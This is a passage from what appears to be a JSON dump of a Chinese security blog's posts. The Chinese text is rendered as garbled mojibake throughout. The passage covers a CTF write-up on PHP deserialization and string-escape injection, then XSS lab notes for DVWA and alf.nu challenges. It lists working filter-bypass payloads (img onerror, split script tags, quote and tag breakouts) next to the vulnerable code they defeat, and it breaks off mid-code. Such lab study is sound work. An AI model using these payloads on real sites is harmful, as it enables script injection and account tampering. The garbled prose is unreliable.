å…¥è¿™ä¸ªå­—ç¬¦ä¸²</p>\n<pre><code>class=O:6:&quot;Shield&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;}</code></pre><p>å°±å¯ä»¥åœ¨æºç ä¸­çœ‹åˆ°flag.</p>\n<p><img src=\"https://i.imgur.com/rAYet4u.png\" alt></p>\n<h2 id=\"ROP-Return-Oriented-programming-é“¾\"><a href=\"#ROP-Return-Oriented-programming-é“¾\" class=\"headerlink\" title=\"ROP(Return-Oriented programming)é“¾\"></a>ROP(Return-Oriented programming)é“¾</h2><p>è¿™é“é¢˜çš„æ”»å‡»é“¾æ¯”è¾ƒç®€å•ã€‚å½“æˆ‘ä»¬ä¼ å…¥åºåˆ—åŒ–å®Œæˆçš„å­—ç¬¦ä¸²åï¼Œç¨‹åºå…ˆå¯¹å…¶ååºåˆ—åŒ–ç”Ÿæˆä¸€ä¸ªå¯¹è±¡ï¼Œè¿™æ—¶æ²¡æœ‰_wakeup()ï¼Œ_destruct()é­”æ³•å‡½æ•°ï¼Œåªæ˜¯ç®€å•çš„ååºåˆ—åŒ–ï¼Œä¹‹åè°ƒç”¨readfile()å‡½æ•°è¿›è¡Œ$fileçš„å†…å®¹çš„è¯»å–ï¼Œè€Œæˆ‘ä»¬å°†$fileçš„å€¼è®¾ç½®ä¸ºäº†pctf.phpï¼Œäºæ˜¯æˆ‘ä»¬å¾—åˆ°äº†è¯¥æ–‡ä»¶çš„å†…å®¹ã€‚<br>ååºåˆ—åŒ–æ¼æ´éœ€è¦ä¸¤ä¸ªæ¡ä»¶ï¼š</p>\n<blockquote>\n<p>1.å­˜åœ¨åºåˆ—åŒ–å­—ç¬¦ä¸²çš„å¯æ§åˆ¶ç‚¹æˆ–è€…è¯´æ˜¯è¾“å…¥ç‚¹</p>\n<p>2.å­˜åœ¨å¯ä»¥åˆ©ç”¨çš„é­”æ³•å‡½æ•°</p>\n</blockquote>\n<h2 id=\"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\"><a href=\"#ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\" class=\"headerlink\" title=\"ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸\"></a>ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸</h2><p>å½“æˆ‘ä»¬åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­é‡åˆ°è¿‡æ»¤å‡½æ•°ï¼Œè¿™ç§è¿‡æ»¤å¯èƒ½æ˜¯</p>\n<ul>\n<li>è¿‡æ»¤åé•¿åº¦å¢åŠ </li>\n<li>è¿‡æ»¤åé•¿åº¦å‡å°‘</li>\n</ul>\n<p>å½“è¦ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²é•¿åº¦å‘ç”Ÿå˜åŒ–æ—¶ï¼Œå°±å¯èƒ½ä¼šå‡ºç°å­—ç¬¦ä¸²é€ƒé€¸çš„é—®é¢˜ã€‚</p>\n<p>æ¯”å¦‚æˆ‘ç°åœ¨æœ‰å¦‚ä¸‹ä»£ç ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">$username = <span class=\"string\">'luc1fer3'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$ser = <span class=\"keyword\">array</span>($username,$pwd);</span><br><span class=\"line\">var_dump(serialize($ser)).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">$b = replace(serialize($ser));</span><br><span class=\"line\">var_dump($b).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æ‰§è¡Œç»“æœï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string(<span class=\"number\">41</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer3<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span></span><br><span class=\"line\">string(<span class=\"number\">42</span>) <span class=\"string\">\"a:2:&#123;i:0;s:8:\"</span>luc1fer22<span class=\"string\">\";i:1;s:5:\"</span>admin<span class=\"string\">\";&#125;\"</span> <span class=\"comment\">//å±æ€§é•¿åº¦ä»ç„¶æ˜¯ 8</span></span><br></pre></td></tr></table></figure>\n\n<p>è¿™æ˜¯é•¿åº¦å¢åŠ çš„æƒ…å†µã€‚ç°åœ¨è€ƒè™‘ä¸€ç§æƒ…å†µï¼šæˆ‘ä»¬è¦æ±‚æ›´æ”¹å¯†ç ä¸º <code>admin888</code> ï¼Œè¯¥æ€ä¹ˆåšï¼Ÿ</p>\n<p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“å¦‚æœå­—ç¬¦ä¸²çš„é•¿åº¦ä¸åºåˆ—åŒ–åçš„å±æ€§é•¿åº¦ä¸åŒï¼Œååºåˆ—åŒ–æ˜¯ä¼šæŠ¥é”™çš„</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:4:\"admin\";&#125;'</span>; <span class=\"comment\">//ä¿®æ”¹é•¿åº¦ä¸º4</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\">PHP Notice:  unserialize(): Error at offset <span class=\"number\">37</span> of <span class=\"number\">41</span> bytes</span><br><span class=\"line\">    bool(<span class=\"keyword\">false</span>)</span><br></pre></td></tr></table></figure>\n\n<p>å¹¶ä¸”ï¼Œphp åœ¨ååºåˆ—åŒ–æ—¶ä¼šæŠŠä¸€äº›å­—ç¬¦å½“ä½œåˆ†éš”ç¬¦ <code>}</code> </p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$e = <span class=\"string\">'a:2:&#123;i:0;s:8:\"luc1fer3\";i:1;s:5:\"admin\";&#125;;i:2;s:2:\"ab\";&#125;'</span>; <span class=\"comment\">//è¯†åˆ«åˆ°ç¬¬ä¸€ä¸ª &#125; ä¹‹åå°±è®¤ä¸ºç›®æ ‡å­—ç¬¦ä¸²ç»“æŸï¼Œåé¢çš„ä¼šå¿½ç•¥æ‰ã€‚</span></span><br><span class=\"line\">var_dump(unserialize($e));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">array</span>(<span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">  [<span class=\"number\">0</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">8</span>) <span class=\"string\">\"luc1fer3\"</span></span><br><span class=\"line\">  [<span class=\"number\">1</span>]=&gt;</span><br><span class=\"line\">  string(<span class=\"number\">5</span>) <span class=\"string\">\"admin\"</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>äºæ˜¯æˆ‘ä»¬å¯ä»¥æƒ³åˆ°ï¼Œå¦‚æœæˆ‘ä»¬è‡ªå·±æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²ï¼Œæ‰‹åŠ¨é—­åˆ <code>}</code> , é‚£æˆ‘ä»¬å°±å¯ä»¥å¼ºè¡Œåœ¨ååºåˆ—åŒ–ä¹‹åå¡å…¥ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„å±æ€§ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$new_pwd = <span class=\"string\">'\";i:1;s:8:\"admin888\";&#125;'</span>; <span class=\"comment\">//length = 22 ç¬¬ä¸€ä¸ªåŒå¼•å·ç”¨æ¥é—­åˆ username</span></span><br></pre></td></tr></table></figure>\n\n<p>è€ƒè™‘åˆ°å‰é¢çš„è¿‡æ»¤å‡½æ•°ï¼Œæˆ‘ä»¬çš„è®¡åˆ’æ˜¯è®¾æ³•ä½¿è¿‡æ»¤åçš„é•¿åº¦å¢åŠ ï¼ˆå› ä¸ºç³»åˆ—åŒ–åçš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†ï¼Œä½†æ˜¯å±æ€§çš„é•¿åº¦å¹¶ä¸å˜ï¼‰ï¼Œè®©åç³»åˆ—åŒ–æ—¶ç³»ç»Ÿè¯»å–çš„æ˜¯è¿‡æ»¤åå¢åŠ çš„æ•°æ®ï¼Œç„¶åæŠŠæ„é€ çš„æ•°æ®å˜æˆæ–°çš„å±æ€§ï¼š</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;\";i:1;s:5:\"admin\";&#125;'</span> </span><br><span class=\"line\">    <span class=\"comment\">//æ³¨æ„è¿™é‡Œæˆ‘ä»¬æ ¹æ®æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦å¢åŠ äº†21ä¸ª3ï¼Œå¯ä»¥çœ‹åˆ°</span></span><br><span class=\"line\">    luc1fer3333333333333333333333<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125; </span></span><br><span class=\"line\"><span class=\"string\">    çš„é•¿åº¦æ˜¯ 8+21+22=73</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">'a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">' </span></span><br><span class=\"line\"><span class=\"string\">\t//è¿‡æ»¤å51æ²¡å˜ï¼Œä½†æ˜¯</span></span><br><span class=\"line\"><span class=\"string\">luc1fer22222222222222222222222222222222222222222222\";i:1;s:8:\"admin888\";&#125;å®é™…é•¿åº¦å´å˜æˆäº† 8+21+22+22</span></span><br></pre></td></tr></table></figure>\n\n<p>æ¯å‡ºç°ä¸€ä¸ª 3 å°±æ›¿æ¢æˆ 22 ,é•¿åº¦åŠ  1 ã€‚ æˆ‘ä»¬æ„é€ çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯ 22 ï¼Œæˆ‘ä»¬å°±éœ€è¦ä½¿ç”¨ 22 ä¸ª(æœ¬æ¥å¸¦çš„æœ‰ä¸€ä¸ªï¼Œæ‰€ä»¥æ·»åŠ 21ä¸ªå°±å¯ä»¥) 3 æ¥ä½¿é•¿åº¦å¢åŠ 22ã€‚</p>\n<p>ä»ä¸Šé¢çš„ä¾‹å­å¯ä»¥çœ‹å‡ºï¼Œè¿‡æ»¤åçš„å±æ€§é•¿åº¦51ï¼Œåœ¨åç³»åˆ—åŒ–çš„æ—¶å€™åˆšå¥½æŠŠæ›¿æ¢åçš„æ•°æ®è¯»å®Œï¼Œæˆ‘ä»¬æ„é€ çš„æ•°æ®é—­åˆäº†åŒå¼•å·å°±é€ƒé€¸å‡ºæ¥å˜æˆæ–°å±æ€§äº†ã€‚åé¢åŸæ¥çš„å±æ€§ä¼šè¢«å¿½ç•¥ã€‚</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$username = <span class=\"string\">'luc1fer3333333333333333333333\";i:1;s:8:\"admin888\";&#125;'</span>;</span><br><span class=\"line\">$pwd = <span class=\"string\">'admin'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">replace</span><span class=\"params\">($string)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> str_replace(<span class=\"string\">'3'</span>,<span class=\"string\">'22'</span>,$string);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$a = replace(serialize($ser));</span><br><span class=\"line\">var_dump($a).<span class=\"string\">\"\\r\\n\"</span>;</span><br><span class=\"line\">var_dump(unserialize($a));</span><br><span class=\"line\"></span><br><span class=\"line\">string(<span class=\"number\">107</span>) <span class=\"string\">\"a:2:&#123;i:0;s:51:\"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\";i:1;s:8:\"</span>admin888<span class=\"string\">\";&#125;\"</span>;i:<span class=\"number\">1</span>;s:<span class=\"number\">5</span>:<span class=\"string\">\"admin\"</span>;&#125;<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">array(2) &#123;</span></span><br><span class=\"line\"><span class=\"string\">  [0]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(51) \"</span>luc1fer22222222222222222222222222222222222222222222<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">  [1]=&gt;</span></span><br><span class=\"line\"><span class=\"string\">  string(8) \"</span>admin888<span class=\"string\">\"</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n","text":"åºåˆ—åŒ–ä¸ååºåˆ—åŒ–0x01ä¸ºä»€ä¹ˆè¦åºåˆ—åŒ–phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¸ºåºåˆ—åŒ–ã€‚åœ¨ä¼ é€’å˜é‡çš„è¿‡ç¨‹ä¸­æœ‰å¯èƒ½é‡åˆ°å˜é‡å€¼è·¨è„šæœ¬ä¼ è¾“çš„è¿‡ç¨‹ã€‚æ¯”å¦‚æ–‡ä»¶ç»“æ„æ˜¯è¿™æ ·çš„ï¼š [Figure] ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"serialize","slug":"serialize","count":4,"path":"api/tags/serialize.json"}]},{"title":"XSS å­¦ä¹ ","slug":"xsså¤‡å¿˜","date":"2019-12-25T12:56:41.000Z","updated":"2020-04-29T05:44:51.496Z","comments":true,"path":"api/articles/xsså¤‡å¿˜.json","excerpt":"","keywords":null,"cover":null,"content":"<h1 id=\"xsså¤‡å¿˜\"><a href=\"#xsså¤‡å¿˜\" class=\"headerlink\" title=\"xsså¤‡å¿˜\"></a>xsså¤‡å¿˜</h1><p>11/1/2019 10:50:21 AM </p>\n<h2 id=\"DVWA\"><a href=\"#DVWA\" class=\"headerlink\" title=\"DVWA\"></a>DVWA</h2><h3 id=\"reflected\"><a href=\"#reflected\" class=\"headerlink\" title=\"reflected\"></a>reflected</h3><p><strong>low</strong></p>\n<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>&lt;scRiPt&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>&lt;?php\n\nheader (&quot;X-XSS-Protection: 0&quot;);\n\n// Is there any input?\nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) {\n    // Get input\n    $name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $_GET[ &apos;name&apos; ] );\n\n    // Feedback for end user\n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;;\n}\n\n?&gt; </code></pre><p>é»‘åå•è¿‡æ»¤ï¼Œé‡‡ç”¨æ­£åˆ™ä¸åŒºåˆ†å¤§å°å†™ï¼ŒåŒå†™ã€å¤§å°å†™æ··æ·†ä¸è¡Œäº†ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å…¶ä»–çš„äº‹ä»¶æ ‡ç­¾ï¼š</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &apos;name&apos; ] != NULL ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $name = htmlspecialchars( $_GET[ &apos;name&apos; ] ); \n    // Feedback for end user \n    echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;; \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h2 id=\"Stored\"><a href=\"#Stored\" class=\"headerlink\" title=\"Stored\"></a>Stored</h2><p><strong>low</strong></p>\n<p>name å¤„é•¿åº¦é™åˆ¶ï¼Œ Message å¤„å°è¯• <code>&lt;script&gt;alert(1);&lt;/script&gt;</code></p>\n<p><strong>medium</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = str_replace( &apos;&lt;script&gt;&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p><code>strip_tages</code> ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„ HTMLã€XML ä»¥åŠ PHP æ ‡ç­¾ï¼Œä½†å…è®¸ä½¿ç”¨ <code>&lt;b&gt;</code> æ ‡ç­¾ã€‚  <code>addslashes</code>  è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦(å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULL)ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²ï¼› <code>htmlspecialchars</code> å¯¹å‚æ•°è¿›è¡Œå®ä½“ç¼–ç ï¼Œæ— æ³•å†å¯¹ <code>message</code> è¿›è¡Œ XSS ï¼Œä½†æ˜¯ <code>name</code> å¤„å¯ä»¥é€šè¿‡ä¿®æ”¹é•¿åº¦è¿›è¡Œ xssã€‚</p>\n<pre><code>&lt;sc&lt;script&gt;ript&gt;alert(1);&lt;/script&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>$message = strip_tags( addslashes( $message ) );\n$message = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $message ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));\n$message = htmlspecialchars( $message );\n\n// Sanitize name input\n$name = preg_replace( &apos;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&apos;, &apos;&apos;, $name );\n$name = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $name ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</code></pre><p>ä¼¼æ›¾ç›¸è¯†å‘¢ğŸ˜‹</p>\n<pre><code>&lt;img src onerror=alert(1);&gt;</code></pre><p><strong>impossible</strong></p>\n<pre><code>&lt;?php \nif( isset( $_POST[ &apos;btnSign&apos; ] ) ) { \n    // Check Anti-CSRF token \n    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); \n    // Get input \n    $message = trim( $_POST[ &apos;mtxMessage&apos; ] ); \n    $name    = trim( $_POST[ &apos;txtName&apos; ] ); \n    // Sanitize message input \n    $message = stripslashes( $message ); \n    $message = mysql_real_escape_string( $message ); \n    $message = htmlspecialchars( $message ); \n    // Sanitize name input \n    $name = stripslashes( $name ); \n    $name = mysql_real_escape_string( $name ); \n    $name = htmlspecialchars( $name ); \n    // Update database \n    $data = $db-&gt;prepare( &apos;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&apos; ); \n    $data-&gt;bindParam( &apos;:message&apos;, $message, PDO::PARAM_STR ); \n    $data-&gt;bindParam( &apos;:name&apos;, $name, PDO::PARAM_STR ); \n    $data-&gt;execute(); \n} \n// Generate Anti-CSRF token \ngenerateSessionToken(); \n?&gt;</code></pre><h3 id=\"DOM\"><a href=\"#DOM\" class=\"headerlink\" title=\"DOM\"></a>DOM</h3><p><strong>low</strong>    </p>\n<pre><code>?default=English&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><strong>medium</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n    $default = $_GET[&apos;default&apos;];\n\n    # Do not allow script tags\n    if (stripos ($default, &quot;&lt;script&quot;) !== false) {\n        header (&quot;location: ?default=English&quot;);\n        exit;\n    }\n} </code></pre><p>è¿‡æ»¤äº† <code>&lt;script</code> ,è§‚å¯Ÿé¡µé¢æºç ï¼Œæ‰‹åŠ¨é—­åˆäº‹ä»¶æ ‡ç­¾ <code>&lt;/option&gt;</code> ã€ <code>&lt;/select&gt;</code>ï¼Œç”±äºä»£ç åªæ£€æµ‹ <code>$default</code> ,äºæ˜¯æˆ‘ä»¬åé¢çš„ä»£ç å¯ä»¥é€ƒé€¸ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English&gt;1&lt;/option&gt;&lt;/select&gt;&lt;img src onerror=alert(1)&gt;</code></pre><p><strong>high</strong></p>\n<pre><code>if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &apos;default&apos; ]) ) {\n\n    # White list the allowable languages\n    switch ($_GET[&apos;default&apos;]) {\n        case &quot;French&quot;:\n        case &quot;English&quot;:\n        case &quot;German&quot;:\n        case &quot;Spanish&quot;:\n            # ok\n            break;\n        default:\n            header (&quot;location: ?default=English&quot;);\n            exit;\n    }\n}</code></pre><p>URL ä¸­æ‰€æœ‰åœ¨ # ä¹‹åçš„éƒ½ä¼šè¢«åˆ†å‰²ï¼Œä¸ä¼šå‘é€åˆ°æœåŠ¡ç«¯ï¼Œå› æ­¤ä¸ä¼šè¢«è¿‡æ»¤ï¼Œæ¶æ„ä»£ç ä¼šåœ¨åˆ›å»ºé¡µé¢æ—¶è¢«ç”¨æ¥æ¸²æŸ“<br>è¯»å–é¡µé¢å†…å®¹ã€‚</p>\n<p>payload:</p>\n<pre><code>?default=English#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>æµè§ˆå™¨å¦‚ä½•æ¸²æŸ“ä¸€ä¸ªé¡µé¢ï¼Œæ‰¾åˆ°ä¸€ç¯‡å›½å¤–çš„æ–‡ç« ï¼š<a href=\"https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969\" target=\"_blank\" rel=\"noopener\">https://itnext.io/how-the-browser-renders-a-web-page-dom-cssom-and-rendering-df10531c9969</a></p>\n<p>HTMLäº‹ä»¶å±æ€§ï¼š<a href=\"https://www.w3school.com.cn/tags/html_ref_eventattributes.asp\" target=\"_blank\" rel=\"noopener\">https://www.w3school.com.cn/tags/html_ref_eventattributes.asp</a></p>\n<h1 id=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\"><a href=\"#ä¸‹é¢æ˜¯å¦ä¸€ä¸ª-xss-é¶åœº\" class=\"headerlink\" title=\"ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº\"></a>ä¸‹é¢æ˜¯å¦ä¸€ä¸ª xss é¶åœº</h1><p>é¶åœºåœ°å€ï¼š<a href=\"https://alf.nu/alert1\" target=\"_blank\" rel=\"noopener\">https://alf.nu/alert1</a></p>\n<h2 id=\"Warmup\"><a href=\"#Warmup\" class=\"headerlink\" title=\"Warmup\"></a>Warmup</h2><pre><code>function escape(s) {\n  return &apos;&lt;script&gt;console.log(&quot;&apos;+s+&apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„å€¼æ²¡æœ‰è¿‡æ»¤ç›´æ¥æ‹¼æ¥åˆ°å­—ç¬¦ä¸²ä¸­ï¼Œé—­åˆå‰é¢çš„æ ‡ç­¾å³å¯</p>\n<pre><code>1&quot;);alert(1)//    &lt;script&gt;console.log(&quot;1&quot;);alert(1)//&quot;);&lt;/script&gt;\n1&quot;);alert(1,&quot;     &lt;script&gt;console.log(&quot;1&quot;);alert(1,&quot;&quot;);&lt;/script&gt;</code></pre><h2 id=\"Adobe\"><a href=\"#Adobe\" class=\"headerlink\" title=\"Adobe\"></a>Adobe</h2><pre><code>function escape(s) {\n  s = s.replace(/&quot;/g, &apos;\\\\&quot;&apos;);\n  return &apos;&lt;script&gt;console.log(&quot;&apos; + s + &apos;&quot;);&lt;/script&gt;&apos;;\n}</code></pre><p>å¯¹è¾“å…¥çš„ <code>&quot;</code> åŠ äº†ä¸€ä¸ªè½¬ä¹‰ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é—­åˆ <code>&lt;script&gt;</code> æ ‡ç­¾ï¼Œæˆ–è€…ç”¨ <code>\\</code> å†æ¬¡è½¬ä¹‰</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//        &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1)//&quot;);&lt;/script&gt;\n\n&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;     &lt;script&gt;console.log(&quot;&lt;/script&gt;&lt;script&gt;alert(1);&lt;/script&gt;&quot;);&lt;/script&gt;\n\n\\&quot;);alert(1)//                     &lt;script&gt;console.log(&quot;\\\\&quot;);alert(1)//&quot;);&lt;/script&gt;</code></pre><h2 id=\"JSON\"><a href=\"#JSON\" class=\"headerlink\" title=\"JSON\"></a>JSON</h2><pre><code>function escape(s) {\n  s = JSON.stringify(s);\n  return &apos;&lt;script&gt;console.log(&apos; + s + &apos;);&lt;/script&gt;&apos;;\n}</code></pre><p>ä¸ç¬¬äºŒé¢˜ä¸€æ ·</p>\n<pre><code>&lt;/script&gt;&lt;script&gt;alert(1)//</code></pre><h3 id=\"Markdown\"><a href=\"#Markdown\" class=\"headerlink\" title=\"Markdown\"></a>Markdown</h3><pre><code>function escape(s) {\n  var text = s.replace(/&lt;/g, &apos;&amp;lt;&apos;).replace(/&quot;/g, &apos;&amp;quot;&apos;);\n  // URLs\n  text = text.replace(/(http:\\/\\/\\S+)/g, &apos;&lt;a href=&quot;$1&quot;&gt;$1&lt;/a&gt;&apos;);\n  // [[img123|Description]]\n  text = text.replace(/\\[\\[(\\w+)\\|(.+?)\\]\\]/g, &apos;&lt;img alt=&quot;$2&quot; src=&quot;$1.gif&quot;&gt;&apos;);\n  return 